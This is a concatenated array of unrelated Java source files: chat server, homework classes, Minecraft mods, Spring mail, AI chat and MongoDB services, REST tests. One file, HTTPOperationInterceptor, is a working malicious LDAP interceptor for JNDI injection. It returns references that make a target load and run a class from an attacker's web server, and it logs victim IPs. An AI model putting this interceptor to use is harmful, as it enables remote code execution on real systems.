  bos = new BufferedOutputStream(\n                        new FileOutputStream(fileReceive));\n                // write file content\n                bos.write(fileInfo.getDataBytes());\n                bos.flush();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        } finally {\n            closeStream(bos);\n        }\n        return true;\n    }\n\t\n\tpublic static void closeStream(InputStream inputStream) {\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n  public static void closeStream(OutputStream outputStream) {\n        try {\n            if (outputStream != null) {\n                outputStream.close();\n            }\n        } catch (IOException ex) {\n            ex.printStackTrace();\n        }\n    }\n\n\t/**\n\t * Create the frame.\n\t */\n\tpublic Server() {\n\t\tsetIconImage(Toolkit.getDefaultToolkit().getImage(Server.class.getResource(\"/Images/icon.png\")));\n\t\tsetTitle(\"Server\");\n\t\tsetDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n\t\tsetBounds(100, 100, 567, 379);\n\t\tcontentPane = new JPanel();\n\t\tcontentPane.setBorder(new EmptyBorder(5, 5, 5, 5));\n\t\tsetContentPane(contentPane);\n\t\tcontentPane.setLayout(null);\n\n\t\tmsg_area = new TextArea();\n\t\tmsg_area.setFont(new Font(\"Times New Roman\", Font.PLAIN, 12));\n\t\tmsg_area.setBounds(10, 47, 531, 222);\n\t\tcontentPane.add(msg_area);\n\n\t\tmsg_text = new JTextField();\n\t\tmsg_text.setFont(new Font(\"Times New Roman\", Font.PLAIN, 12));\n\t\tmsg_text.setBounds(10, 279, 450, 52);\n\t\tcontentPane.add(msg_text);\n\t\tmsg_text.setColumns(10);\n\n\t\tJButton btnNewButton = new JButton(\"Send\");\n\t\tbtnNewButton.addActionListener(new ActionListener() {\n\t\t\tpublic void actionPerformed(ActionEvent e) {\n\t\t\n\t\t\t\tSmsOutServer write = new SmsOutServer();\n\t\t\t\twrite.start();\n\t\t\t\t\n\t\t\t}\n\t\t});\n\t\tbtnNewButton.setFont(new Font(\"Times New Roman\", Font.BOLD, 16));\n\t\tbtnNewButton.setForeground(Color.RED);\n\t\tbtnNewButton.setBounds(462, 293, 89, 21);\n\t\tcontentPane.add(btnNewButton);\n\n\t\tlblPort = new JLabel(\"Port Number\");\n\t\tlblPort.setForeground(Color.YELLOW);\n\t\tlblPort.setFont(new Font(\"Times New Roman\", Font.BOLD, 14));\n\t\tlblPort.setBounds(169, 16, 81, 21);\n\t\tcontentPane.add(lblPort);\n\t\t\n\t\tJLabel lblNewLabel_1 = new JLabel(\"49\");\n\t\tlblNewLabel_1.setForeground(Color.YELLOW);\n\t\tlblNewLabel_1.setFont(new Font(\"Times New Roman\", Font.BOLD, 16));\n\t\tlblNewLabel_1.setBounds(263, 20, 48, 13);\n\t\tcontentPane.add(lblNewLabel_1);\n\t\t\n\t\tlblNewLabel = new JLabel(\"\");\n\t\tlblNewLabel.setIcon(new ImageIcon(Server.class.getResource(\"/Images/server.jpg\")));\n\t\tlblNewLabel.setBounds(0, 0, 551, 341);\n\t\tcontentPane.add(lblNewLabel);\n\t}\n\n\t\n\t\n\n\t\n\tclass WaitingClient extends Thread{\n\t\tpublic void run() {\n\t\t\ttry {\n\t\t\t\twhile(true) {\n\t\t\t\t\tsocket = serverSocket.accept();\n\t\t\t\t\tServer.listSK.add(socket);\n\t\t\t\t\tJOptionPane.showMessageDialog(fame, socket +\"is connected to the Server\\n We can chat now\", \"Note\",JOp",
    "/*\n * To change this license header, choose License Headers in Project Properties.\n * To change this template file, choose Tools | Templates\n * and open the template in the editor.\n */\npackage homework7;\n\n\n/**\n *\n * @author ya\n */\npublic class cake {\n    private int noLayers;\n    private final String flavour;\n    private Filling filling;\n\n    public cake(int noLayers, String flavour, Filling filling) {\n        this.noLayers = noLayers;\n        this.flavour = flavour;\n        this.filling = filling;\n    }\n\n    public void setNoLayers(int noLayers) {\n        this.noLayers = noLayers;\n    }\n\n    public void setFilling(Filling filling) {\n        this.filling = filling;\n    }\n\n    public String getFlavour() {\n        return flavour;\n    }\n\n    public Filling getFilling() {\n        return filling;\n    }\n\n    public int getNoLayers() {\n        return noLayers;\n    }\n    \n    public int calcPrice(){\n        return 20*noLayers;\n    }\n\n    @Override\n    public String toString() {\n        return \"cake{\" + \"noLayers=\" + noLayers + \", flavour=\" + flavour + \", filling=\" + filling + '}';\n    }\n    \n}\n",
    "/*      Remote player waypoints for Xaero's Map\n        Copyright (C) 2024  Leander Kn\u00fcttel\n\n        This program is free software: you can redistribute it and/or modify\n        it under the terms of the GNU General Public License as published by\n        the Free Software Foundation, either version 3 of the License, or\n        (at your option) any later version.\n\n        This program is distributed in the hope that it will be useful,\n        but WITHOUT ANY WARRANTY; without even the implied warranty of\n        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n        GNU General Public License for more details.\n\n        You should have received a copy of the GNU General Public License\n        along with this program.  If not, see <https://www.gnu.org/licenses/>.*/\n\n\npackage tbc.remote_player_waypoints_for_xaero.mixin;\n\nimport net.minecraft.client.gui.hud.PlayerListHud;\nimport net.minecraft.client.network.PlayerListEntry;\nimport net.minecraft.scoreboard.Team;\nimport net.minecraft.text.Style;\nimport net.minecraft.text.Text;\nimport org.spongepowered.asm.mixin.Mixin;\nimport org.spongepowered.asm.mixin.injection.At;\nimport org.spongepowered.asm.mixin.injection.Inject;\nimport org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;\nimport tbc.remote_player_waypoints_for_xaero.RemotePlayerWaypointsForXaero;\n\n@Mixin(PlayerListHud.class)\npublic class PlayerListHudMixin {\n    @Inject(method = \"getPlayerName\", at = @At(\"RETURN\"), cancellable = true)\n    private void injected(PlayerListEntry entry, CallbackInfoReturnable<Text> cir){\n        Text newText;\n        var playerNameString = entry.getProfile().getName();\n        if (entry.getDisplayName() == null) {\n            newText = ((PlayerListHud)(Object)this).applyGameModeFormatting(entry, Team.decorateName(entry.getScoreboardTeam(), Text.literal(playerNameString)));\n        } else {\n            newText = ((PlayerListHud)(Object)this).applyGameModeFormatting(entry, entry.getDisplayName().copy());\n        }\n\n        if (!(RemotePlayerWaypointsForXaero.enabled && RemotePlayerWaypointsForXaero.connected)) {\n            cir.setReturnValue(newText);\n            return;\n        }\n\n        if (RemotePlayerWaypointsForXaero.AfkDic.containsKey(playerNameString)) {\n            if (RemotePlayerWaypointsForXaero.AfkDic.get(playerNameString)) {\n                if (RemotePlayerWaypointsForXaero.showAfkTimeInTabList){\n                    cir.setReturnValue(newText.copy().append(Text.literal(\"  [AFK \" + (RemotePlayerWaypointsForXaero.AfkTimeDic.get(playerNameString) / 60) + \" min]\").setStyle(Style.EMPTY.withColor(RemotePlayerWaypointsForXaero.AfkColor))));\n                }\n                else{\n                    cir.setReturnValue(newText.copy().append(Text.literal(\"  [AFK]\").setStyle(Style.EMPTY.withColor(RemotePlayerWaypointsForXaero.AfkColor))));\n                }\n                return;\n            }\n        } else {\n            cir.setReturnValue(newText.copy().append(Text.literal(\"  [???]\").setStyle(Style.EMPTY.withColor(RemotePlayerWaypointsForXaero.unknownAfkStateColor))));\n            return;\n        }\n        cir.setReturnValue(newText);\n    }\n}\n",
    "/*\npackage com.example.myfirstapplication;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\nimport androidx.navigation.fragment.NavHostFragment;\nimport com.example.myfirstapplication.databinding.FragmentFirstBinding;\n\npublic class FirstFragment extends Fragment {\n\n    private FragmentFirstBinding binding;\n\n    @Override\n    public View onCreateView(\n            LayoutInflater inflater, ViewGroup container,\n            Bundle savedInstanceState\n    ) {\n\n        binding = FragmentFirstBinding.inflate(inflater, container, false);\n        binding.textviewFirst.append(\"hello world\");\n        return binding.getRoot();\n\n    }\n\n    public void onViewCreated(@NonNull View view, Bundle savedInstanceState) {\n        super.onViewCreated(view, savedInstanceState);\n\n        binding.buttonFirst.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View view) {\n                NavHostFragment.findNavController(FirstFragment.this)\n                        .navigate(R.id.action_login_to_homepage);\n            }\n        });\n    }\n\n    @Override\n    public void onDestroyView() {\n        super.onDestroyView();\n        binding = null;\n    }\n\n}*/\n",
    "package com.managementsystem.employeemanagementwebapp.mail;\n\nimport jakarta.mail.MessagingException;\nimport jakarta.mail.internet.MimeMessage;\nimport org.springframework.mail.javamail.JavaMailSender;\nimport org.springframework.mail.javamail.MimeMessageHelper;\nimport org.springframework.stereotype.Service;\nimport org.thymeleaf.spring6.SpringTemplateEngine;\nimport org.thymeleaf.context.Context;\n\n@Service\npublic class MailService {\n\n    private final JavaMailSender emailSender;\n\n    private final SpringTemplateEngine templateEngine;\n\n    public MailService(JavaMailSender emailSender, SpringTemplateEngine templateEngine) {\n        this.emailSender = emailSender;\n        this.templateEngine = templateEngine;\n    }\n\n    public void sendSimpleMessage(String to, String subject, String text) {\n        MimeMessage message = emailSender.createMimeMessage();\n        MimeMessageHelper helper = new MimeMessageHelper(message);\n        try {\n            helper.setTo(to);\n            helper.setSubject(subject);\n            helper.setText(text, true); // true indicates html\n            emailSender.send(message);\n        } catch (MessagingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendHtmlMessage(String to, String subject, String templateName, Context context) {\n        MimeMessage message = emailSender.createMimeMessage();\n        try {\n            MimeMessageHelper helper = new MimeMessageHelper(message, true);\n            helper.setTo(to);\n            helper.setSubject(subject);\n\n            String htmlContent = templateEngine.process(templateName, context);\n            helper.setText(htmlContent, true);\n\n            emailSender.send(message);\n        } catch (MessagingException e) {\n            e.printStackTrace();\n        }\n    }\n}\n",
    "package io.quarkiverse.seven.wonders.demo;\n\nimport jakarta.annotation.PostConstruct;\nimport jakarta.enterprise.context.ApplicationScoped;\nimport jakarta.ws.rs.GET;\nimport jakarta.ws.rs.Path;\nimport jakarta.ws.rs.Produces;\nimport org.mvnpm.importmap.Aggregator;\n\n/**\n * Dynamically create the import map\n */\n@ApplicationScoped\n@Path(\"/_importmap\")\npublic class ImportmapResource {\n    private String importmap;\n\n    // See https://github.com/WICG/import-maps/issues/235\n    // This does not seem to be supported by browsers yet...\n    @GET\n    @Path(\"/dynamic.importmap\")\n    @Produces(\"application/importmap+json\")\n    public String importMap() {\n        return this.importmap;\n    }\n\n    @GET\n    @Path(\"/dynamic-importmap.js\")\n    @Produces(\"application/javascript\")\n    public String importMapJson() {\n        return JAVASCRIPT_CODE.formatted(this.importmap);\n    }\n\n    @PostConstruct\n    void init() {\n        Aggregator aggregator = new Aggregator();\n        // Add our own mappings\n        aggregator.addMapping(\"icons/\", \"/icons/\");\n        aggregator.addMapping(\"components/\", \"/components/\");\n        aggregator.addMapping(\"fonts/\", \"/fonts/\");\n        this.importmap = aggregator.aggregateAsJson();\n    }\n\n    private static final String JAVASCRIPT_CODE = \"\"\"\n            const im = document.createElement('script');\n            im.type = 'importmap';\n            im.textContent = JSON.stringify(%s);\n            document.currentScript.after(im);\n            \"\"\";\n}\n",
    "package testclasses.exceptions.outofbounds.arrayload;\n\nimport dev.skidfuscator.annotations.NativeObfuscation;\n\npublic class CatchArrayLoadOutOfBoundsInt {\n    private int[] array;\n\n    public CatchArrayLoadOutOfBoundsInt() {\n        this.array = new int[2];\n    }\n\n    @NativeObfuscation\n    public int exec() {\n        int res = 0;\n\n        try {\n            res += this.array[2];\n            res += 1000;\n        } catch (ArrayIndexOutOfBoundsException e) {\n            res++;\n        }\n\n        try {\n            res += this.array[2];\n            res += 1000;\n        } catch (IndexOutOfBoundsException e) {\n            res++;\n        }\n\n        try {\n            res += this.array[2];\n            res += 1000;\n        } catch (RuntimeException e) {\n            res++;\n        }\n\n        try {\n            res += this.array[2];\n            res += 1000;\n        } catch (Exception e) {\n            res++;\n        }\n\n        try {\n            res += this.array[2];\n            res += 1000;\n        } catch (Throwable e) {\n            res++;\n        }\n\n        return res;\n    }\n}\n",
    "package com.ningning0111.service.impl;\n\nimport com.ningning0111.common.ApplicationConstant;\nimport com.ningning0111.common.BaseResponse;\nimport com.ningning0111.common.ErrorCode;\nimport com.ningning0111.common.ResultUtils;\nimport com.ningning0111.exception.BusinessException;\nimport com.ningning0111.model.dto.ChatOptions;\nimport com.ningning0111.model.dto.ChatDTO;\nimport com.ningning0111.model.entity.OneApi;\nimport com.ningning0111.service.ChatService;\nimport com.ningning0111.service.OneApiService;\nimport com.ningning0111.service.StoreFileService;\nimport lombok.RequiredArgsConstructor;\nimport org.springframework.ai.chat.ChatClient;\nimport org.springframework.ai.chat.ChatResponse;\nimport org.springframework.ai.chat.StreamingChatClient;\nimport org.springframework.ai.chat.messages.*;\nimport org.springframework.ai.chat.prompt.Prompt;\nimport org.springframework.ai.chat.prompt.SystemPromptTemplate;\nimport org.springframework.ai.document.Document;\nimport org.springframework.ai.openai.OpenAiChatClient;\nimport org.springframework.ai.openai.OpenAiChatOptions;\nimport org.springframework.ai.openai.api.OpenAiApi;\nimport org.springframework.ai.vectorstore.VectorStore;\nimport org.springframework.stereotype.Service;\nimport reactor.core.publisher.Flux;\nimport cn.hutool.core.util.StrUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.stream.Collectors;\n\n/**\n * @Project: com.ningning0111.service.impl\n * @Author: pgthinker\n * @GitHub: https://github.com/ningning0111\n * @Date: 2024/4/2 20:00\n * @Description:\n */\n@Service\n@RequiredArgsConstructor\npublic class ChatServiceImpl implements ChatService {\n    private final OneApiService oneApiService;\n    private final StoreFileService storeFileService;\n\n    // \u6d41\u5f0f\u666e\u901a\u5bf9\u8bdd\n    @Override\n    public Flux<ChatResponse> simpleChat(ChatDTO chatRequest) {\n        if (StrUtil.isBlank(chatRequest.prompt())){\n            return Flux.error(new RuntimeException(String.valueOf(ErrorCode.PROMPT_ERROR)));\n        }\n        StreamingChatClient streamingChatClient = randomGetStreamingChatClient(chatRequest.chatOptions());\n        List<Message> messages = transformAiMessage(chatRequest.messages());\n        String prompt = chatRequest.prompt();\n        UserMessage userMessage = new UserMessage(prompt);\n        messages.add(userMessage);\n        messages = checkMessageLength(messages,chatRequest);\n        return streamingChatClient.stream(new Prompt(messages));\n    }\n    // \u6d41\u5f0fRAG\u5bf9\u8bdd\n    @Override\n    public Flux<ChatResponse> ragChat(ChatDTO chatRequest) {\n        if (StrUtil.isBlank(chatRequest.prompt())){\n            return Flux.error(new RuntimeException(String.valueOf(ErrorCode.PROMPT_ERROR)));\n        }\n        StreamingChatClient streamingChatClient = randomGetStreamingChatClient(chatRequest.chatOptions());\n        String prompt = chatRequest.prompt();\n        List<Message> messages = transformAiMessage(chatRequest.messages());\n        messages = checkMessageLength(messages, chatRequest);\n        Message systemMessage = similaritySearch(prompt);\n        messages.add(0,systemMessage);\n        return streamingChatClient.stream(new Prompt(messages));\n    }\n    // \u975e\u6d41\u5f0f\u7684\u666e\u901a\u5bf9\u8bdd\n    @Override\n    public BaseResponse noStreamSimpleChat(ChatDTO chatRequest) {\n        if (StrUtil.isBlank(chatRequest.prompt())){\n            return ResultUtils.error(ErrorCode.PROMPT_ERROR);\n        }\n        ChatClient chatClient = randomGetChatClient(chatRequest.chatOptions());\n        String prompt = chatRequest.prompt();\n        List<Message> messages = transformAiMessage(chatRequest.messages());\n        messages.add(new UserMessage(prompt));\n        messages = checkMessageLength(messages,chatRequest);\n        ChatResponse resp = chatClient.call(new Prompt(messages));\n        return ResultUtils.success(resp);\n    }\n\n    // \u975e\u6d41\u5f0f\u7684RAG\u5bf9\u8bdd\n    @Override\n    public BaseResponse noStreamRagChat(ChatDTO chatRequest) {\n        if (StrUtil.isBlank(chatRequest.prompt())){\n            return ResultUtils.error(ErrorCode.PROMPT_ERROR);\n        }\n        ChatClient chatClient = randomGetChatClient(chatRequest.chatOptions());\n        String prompt = chatRequest.prompt();\n        List<Message> messages = transformAiMessage(chatRequest.messages());\n        messages.add(new UserMessage(prompt));\n        messages = checkMessageLength(messages,chatRequest);\n        Message systemMessage = similaritySearch(prompt);\n        messages.add(0,systemMessage);\n        ChatResponse resp = chatClient.call(new Prompt(messages));\n        return ResultUtils.success(resp);\n    }\n\n    // \u6a21\u7cca\u67e5\u8be2 \u8fd4\u56de\u7cfb\u7edf\u63d0\u793a\u4fe1\u606f\uff08\u8be5\u4fe1\u606f\u5305\u542b\u4e86\u67e5\u8be2\u5230\u7684\u6587\u6863\uff09\n    private Message similaritySearch(String prompt){\n        VectorStore vectorStore = storeFileService.randomGetVectorStore();\n        List<Document> listOfSimilarDocuments = vectorStore.similaritySearch(prompt);\n        // \u5c06Document\u5217\u8868\u4e2d\u6bcf\u4e2a\u5143\u7d20\u7684content\u5185\u5bb9\u8fdb\u884c\u62fc\u63a5\u83b7\u5f97documents\n        String documents = listOfSimilarDocuments.stream().map(Document::getContent).collect(Collectors.joining());\n        // \u4f7f\u7528Spring AI \u63d0\u4f9b\u7684\u6a21\u677f\u65b9\u5f0f\u6784\u5efaSys",
    "package com.mongodb.spring.template;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.ApplicationRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\n\nimport com.mongodb.spring.template.component.UserOperations;\nimport com.mongodb.spring.template.model.Address;\nimport com.mongodb.spring.template.model.User;\n\n@SpringBootApplication\npublic class AtlasSpringMongoTemplateApplication {\n\t\n\t@Autowired\n\tprivate UserOperations userOp;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(AtlasSpringMongoTemplateApplication.class, args);\n\t}\n\n\t@Bean\n\tpublic ApplicationRunner applicationRunner() {\n\t\treturn args -> {\n\t\t\tUser user = new User();\n\t\t\tuser.setAge(50);\n\t\t\tuser.setEmail(\"gildong.hong@email.com\");\n\t\t\tuser.setName(\"Gildong Hong\");\n\t\t\tuser.setSsn(\"123-456-7890\");\n\t\t\tuser.setDateOfBirth(\"Jan. 1st\");\n\t\t\t\n\t\t\tList<String> Hobbies = new ArrayList();\n\t\t\tHobbies.add(\"Martial arts\");\n\t\t\t\n\t\t\t\n\t\t\tuser.setHobbies(Hobbies);\n\t\t\t\n\t\t\tList<Address> Address = new ArrayList();\n\t\t\t\n\t\t\tAddress.add(new Address(\"office\",\"\uc11c\uc6b8\uc2dc \uac15\ub0a8\uad6c \uc0bc\uc131\ub3d9\",\"\ucf54\uc5d1\uc2a4 6\",\"06132\"));\n\t\t\tAddress.add(new Address(\"home\",\"\uc11c\uc6b8\uc2dc \uac15\ub0a8\uad6c \uc5ed\uc0bc\ub3d9\",\"\uc5ed\uc0bc \ud55c\uad6d \uc544\ud30c\ud2b8 101\ub3d9 101\ud638\",\"06320\"));\n\t\t\t\n\t\t\tuser.setAddresses(Address);\n\t\t\t\n\t\t\tuserOp.insertUser(user);\n\t\t\t//userOp.updateHobby(\"123-456-7890\", \"Reading\");\n\t\t\t//userOp.updateAddress(\"123-456-7890\", \"home\", \"06230\");\n\t\t\t//userOp.deleteBySSN(\"123-456-7890\");\n\t\t};\n\t}\n}\n",
    "package org.interceptor;\n\nimport com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;\nimport com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;\nimport com.unboundid.ldap.sdk.Entry;\nimport com.unboundid.ldap.sdk.LDAPResult;\nimport com.unboundid.ldap.sdk.ResultCode;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.net.Socket;\nimport java.net.SocketAddress;\nimport java.net.URL;\n\npublic class HTTPOperationInterceptor extends InMemoryOperationInterceptor {\n    private String classUrl;\n\n    public HTTPOperationInterceptor(String classUrl) {\n        this.classUrl = classUrl;\n    }\n\n    @Override\n    public void processSearchResult(InMemoryInterceptedSearchResult result) {\n        String base = result.getRequest().getBaseDN();\n        Entry e = new Entry(base);\n        try {\n            sendResult(result, e);\n        } catch (Exception e1) {\n            e1.printStackTrace();\n        }\n\n    }\n\n    protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {\n        //------------\u83b7\u53d6client ip-----------\n        Class<?> aClass = Class.forName(\"com.unboundid.ldap.listener.interceptor.InterceptedOperation\");\n        Method getClientConnection = aClass.getDeclaredMethod(\"getClientConnection\");\n        getClientConnection.setAccessible(true);\n        Object invoke = getClientConnection.invoke(result);\n\n        Class<?> aClass2 = Class.forName(\"com.unboundid.ldap.listener.LDAPListenerClientConnection\");\n        Field socket = aClass2.getDeclaredField(\"socket\");\n        socket.setAccessible(true);\n        Socket socket1 = (Socket) socket.get(invoke);\n\n        SocketAddress remoteSocketAddress = socket1.getRemoteSocketAddress();\n        System.out.println(\"\u6536\u5230ip: \" + remoteSocketAddress.toString().substring(1) + \" \u7684\u8bf7\u6c42\uff01\");\n        //---------------------------------------\n        //\u622a\u53d6class\u540d\u5b57\n        URL url = new URL(classUrl);\n        String host = \"\";\n        if(url.getPort() == -1){\n            host = url.getHost();\n        }else{\n            host = url.getHost()+ \":\" +url.getPort();\n        }\n\n        e.addAttribute(\"javaClassName\", \"foo\");\n        e.addAttribute(\"javaCodeBase\", \"http://\" + host + \"/\");\n        e.addAttribute(\"objectClass\", \"javaNamingReference\"); //$NON-NLS-1$\n        e.addAttribute(\"javaFactory\", url.getPath().replace(\"/\",\"\").replace(\".class\",\"\"));\n        result.sendSearchEntry(e);\n        System.out.println(\"\u5df2\u8fd4\u56deClass\u6240\u5728WEB\u670d\u52a1\u5730\u5740\uff0c\u8bf7\u67e5\u770b\u662f\u5426\u63a5\u6536\u5230\u8bf7\u6c42\");\n        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));\n\n    }\n}\n",
    "\nimport books.Books;\nimport books.LLQueue;\n\npublic class Main {\n\n   \n    public static void main(String[] args) {\n       \n        Books Book1 = new Books(\"the little prenciess\",\"Divid\");\n        Books Book2 = new Books(\"Dracola\",\"Martin\");\n        Books Book3 = new Books(\"Matilda\",\"Harry Styles\");\n        Books Book4 = new Books(\"country\",\"KSA\");\n        Books Book5 = new Books(\"Shipment\",\"Aramex\");\n        \n        LLQueue<Books> AutherBooks = new LLQueue<>();\n\n        AutherBooks.Enqueue(Book1);\n        AutherBooks.Enqueue(Book2);\n        AutherBooks.Enqueue(Book3);\n        \n        System.out.println(\"Authers books is: \");\n        AutherBooks.Display();\n        \n       LLQueue<Books> MyTextBooks = new LLQueue<>(); \n       MyTextBooks.Enqueue(Book3);\n       MyTextBooks.Enqueue(Book5);\n       MyTextBooks.Enqueue(Book4);\n       MyTextBooks.Enqueue(Book2);\n       \n        System.out.println(\"My Text Books is: \");\n        MyTextBooks.Display();\n        \n        int count = 0;\n        while ( ! AutherBooks.isEmpty()){\n            Books Auther = AutherBooks.Dequeue();\n            boolean isFound = MyTextBooks.find(Auther);\n            ;\n            if(isFound){\n              MyTextBooks.RemoveAllEllemnetE(Auther); \n              count++;\n            }\n        }\n        \n       System.out.println(\"My Text Books is: \");\n        MyTextBooks.Display();\n        \n        System.out.println(\"there are \"+count+\" books of MyTextBooks are found in AutherBooks.\"); \n    }\n}",
    "package com.lx862.quitgame;\n\nimport net.minecraft.client.MinecraftClient;\nimport net.minecraft.client.font.TextRenderer;\nimport net.minecraft.client.gui.DrawContext;\nimport net.minecraft.util.math.RotationAxis;\nimport org.joml.Vector2d;\n\npublic class SplashTextCharacter {\n    private final char character;\n    private Vector2d startPos;\n    private Vector2d targetPos;\n    private Vector2d renderedPos;\n    public double width;\n    private boolean dragging;\n\n    public SplashTextCharacter(char character) {\n        this.character = character;\n        this.targetPos = new Vector2d(0, 0);\n        this.renderedPos = new Vector2d(0, 0);\n        this.width = MinecraftClient.getInstance().textRenderer.getWidth(String.valueOf(character));\n    }\n\n    public char getChar() {\n        return character;\n    }\n\n    public void setStartPos(double x, double y) {\n        this.startPos = new Vector2d(x, y);\n    }\n\n    public void setTargetPos(double x, double y) {\n        this.targetPos = new Vector2d(x, y);\n    }\n\n    public void setRenderPos(double x, double y) {\n        this.renderedPos = new Vector2d(x, y);\n    }\n\n    public boolean hovered(double mouseX, double mouseY) {\n        return hoveredXAxis(mouseX) && hoveredYAxis(mouseY);\n    }\n\n    public boolean hoveredXAxis(double mouseX) {\n        double startX = (startPos.x) + (targetPos.x * QuitGame.scale);\n        double endX = startX + ((width + 0.5) * QuitGame.scale);\n        return mouseX >= startX && mouseX <= endX;\n    }\n\n    public boolean hoveredYAxis(double mouseY) {\n        double startY = (startPos.y) + ((targetPos.y - 1) * QuitGame.scale);\n        double endY = startY + ((8 + 2) * QuitGame.scale);\n        return mouseY >= startY && mouseY <= endY;\n    }\n\n    public void render(DrawContext drawContext, double deltaTime, int alpha, TextRenderer textRenderer) {\n        renderedPos = renderedPos.lerp(targetPos, deltaTime);\n\n        drawContext.getMatrices().push();\n        drawContext.getMatrices().translate(renderedPos.x, renderedPos.y, 0);\n        drawContext.getMatrices().multiply(RotationAxis.POSITIVE_Z.rotationDegrees(-QuitGame.rotAngle));\n        drawContext.drawTextWithShadow(textRenderer, String.valueOf(character), 0, 0, 16776960 | alpha);\n        drawContext.getMatrices().pop();\n    }\n\n    public void renderBoundary(DrawContext drawContext, double deltaTime, TextRenderer textRenderer) {\n        double startX = (startPos.x) + (targetPos.x * QuitGame.scale);\n        double startY = (startPos.y) + ((targetPos.y - 1) * QuitGame.scale);\n        double endX = ((width + 0.5) * QuitGame.scale);\n        double endY = ((8 + 2) * QuitGame.scale);\n\n        drawContext.drawBorder((int)startX, (int)startY, (int)endX, (int)endY, 0xFFFFFFFF);\n    }\n\n    public void dragged() {\n        dragging = true;\n    }\n\n    public boolean isDragging() {\n        return dragging;\n    }\n\n    public void released() {\n        dragging = false;\n    }\n}\n",
    "package io.marioslab.sol;\n\nimport com.badlogic.gdx.math.Rectangle;\nimport com.badlogic.gdx.utils.Array;\nimport io.marioslab.sol.command.New;\n\n/**\n * Rectangular area that when touched will trigger a list of commands to be\n * executed\n * @author badlogic\n *\n */\npublic class Trigger {\n\tpublic String name;\n\tpublic boolean disabled;\n\tArray<Command> commands = new Array<Command>();\n\tRectangle rect = new Rectangle();\n\tboolean active = false;\n\t\n\tpublic Trigger(String name, int x, int y, int x2, int y2) {\n\t\tthis.name = name;\n\t\tthis.rect.x = Math.min(x, x2);\n\t\tthis.rect.y = Math.min(y, y2);\n\t\tthis.rect.width = Math.abs(x2 - x);\n\t\tthis.rect.height = Math.abs(y2 - y);\n\t}\n\t\n\tpublic Trigger add(Entity drawable) {\n\t\tcommands.add(new New(drawable));\n\t\treturn this;\n\t}\n\t\n\tpublic Trigger add(Command command) {\n\t\tcommands.add(command);\n\t\treturn this;\n\t}\n\t\n\tpublic boolean hit(int x, int y) {\n\t\treturn rect.contains(x, y);\n\t}\n\t\n\tpublic Trigger disable() {\n\t\tcommands.add(new Command() {\n\t\t\t@Override\n\t\t\tpublic void update (float delta) {\n\t\t\t\tdisabled = true;\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic boolean isDone () {\n\t\t\t\treturn true;\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic Command copy () {\n\t\t\t\treturn this;\n\t\t\t}\n\t\t});\n\t\treturn this;\n\t}\n}\n",
    "package com.zavadimka.restapitests.classwork;\n\nimport io.restassured.response.Response;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\nimport static io.restassured.RestAssured.given;\nimport static io.restassured.http.ContentType.JSON;\nimport static io.restassured.module.jsv.JsonSchemaValidator.matchesJsonSchemaInClasspath;\nimport static org.hamcrest.MatcherAssert.assertThat;\nimport static org.hamcrest.Matchers.is;\nimport static org.hamcrest.Matchers.notNullValue;\n\npublic class LoginTests {\n\n    @Test\n    @DisplayName(\"REST API tests: POST 200\")\n    void postRequestShouldHaveResponse200(){\n        Response responce = given()\n                .log().uri()\n                .log().method()\n                .log().body()\n                .contentType(JSON)\n                .body(\"{ \\\"email\\\": \\\"eve.holt@reqres.in\\\", \\\"password\\\": \\\"cityslicka\\\" }\")\n                .when()\n                .post(\"https://reqres.in/api/login\")\n                .then()\n                .log().status()\n                .log().body()\n                .body(matchesJsonSchemaInClasspath(\"classwork/schemas/success_login_schema.json\"))\n                .statusCode(200)\n                .extract().response();\n\n        assertThat(responce.path(\"token\"), notNullValue());\n\n    }\n\n\n\n    @Test\n    @DisplayName(\"REST API tests: POST negative 400\")\n    void negativePostRequestTest200(){\n        Response responce = given()\n                .log().uri()\n                .log().method()\n                .body(\"{ \\\"email\\\": \\\"eve.holt@reqres.in\\\", \\\"password\\\": \\\"cityslicka\\\" }\")\n                .when()\n                .post(\"https://reqres.in/api/login\")\n                .then()\n                .log().status()\n                .log().body()\n                .statusCode(400)\n                .extract().response();\n\n        assertThat(responce.path(\"error\"), is(\"Missing email or username\"));\n\n    }\n}\n",
    "package src.Models;\n\npublic class Endereco {\n    private String cep;\n    private String estado;\n    private String cidade;\n    private String rua;\n    private String numero;\n    private String complemento;\n\n    public Endereco(String cep, String estado, String cidade, String rua, String numero, String complemento) {\n        this.cep = cep;\n        this.estado = estado;\n        this.cidade = cidade;\n        this.rua = rua;\n        this.numero = numero;\n        this.complemento = complemento;\n    }\n\n    public Endereco() {\n        super();\n    }\n\n    public String getCep() {\n        return cep;\n    }\n\n    public void setCep(String cep) {\n        this.cep = cep;\n    }\n\n    public String getEstado() {\n        return estado;\n    }\n\n    public void setEstado(String estado) {\n        this.estado = estado;\n    }\n\n    public String getCidade() {\n        return cidade;\n    }\n\n    public void setCidade(String cidade) {\n        this.cidade = cidade;\n    }\n\n    public String getRua() {\n        return rua;\n    }\n\n    public void setRua(String rua) {\n    